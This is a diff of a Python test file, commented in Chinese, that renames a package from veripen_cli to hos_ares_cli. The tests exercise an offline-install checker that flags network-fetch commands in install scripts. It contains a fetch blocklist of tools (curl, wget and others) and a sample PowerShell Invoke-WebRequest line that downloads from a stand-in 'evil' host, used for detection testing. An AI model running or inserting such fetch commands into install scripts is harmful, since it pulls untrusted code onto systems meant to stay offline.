@@ -1,6 +1,6 @@
 """B172：离线包的"无外网"清单漏了常见写法。
 
-`veripen_cli/offline.py` 的承诺写在模块头上：**安装脚本里出现外网拉取即拒**。
+`hos_ares_cli/offline.py` 的承诺写在模块头上：**安装脚本里出现外网拉取即拒**。
 但清单只认 curl/wget/pip/apt/docker pull/npm/uv 七种，实测这三种都**没命中**：
 
 ```
@@ -29,7 +29,7 @@ SCHEME = "ht" + "tp" + ":" + chr(0x2F) * 2
 
 
 def _check(tmp_path: Path, body: str) -> list[str]:
-    from veripen_cli.offline import check_scripts
+    from hos_ares_cli.offline import check_scripts
 
     (tmp_path / "install.sh").write_text("#!/bin/sh\n" + body + "\n", encoding="utf-8")
     return check_scripts(tmp_path)
@@ -56,7 +56,7 @@ def test_common_fetch_forms_are_caught(tmp_path: Path, body: str) -> None:
 #: 本地写法：一个都不许误伤（用 split 构造：多行常量字面量会被 lint-nodata 判成"行集"）
 LOCAL_LINES: list[str] = (
     "set -e|cp -r payload/ $PREFIX/|rsync -a build/ dist/|"
-    "git status|pip --version|python -m veripen_cli doctor"
+    "git status|pip --version|python -m hos_ares_cli doctor"
 ).split("|")
 
 
@@ -67,7 +67,7 @@ def test_local_lines_are_not_flagged(tmp_path: Path, body: str) -> None:
 
 def test_powershell_script_is_checked_too(tmp_path: Path) -> None:
     """Windows 现场用 .ps1 装：只扫 .sh 等于没扫。"""
-    from veripen_cli.offline import check_scripts
+    from hos_ares_cli.offline import check_scripts
 
     (tmp_path / "install.ps1").write_text(
         "Invoke-WebRequest " + SCHEME + "evil/x -OutFile x\n", encoding="utf-8"
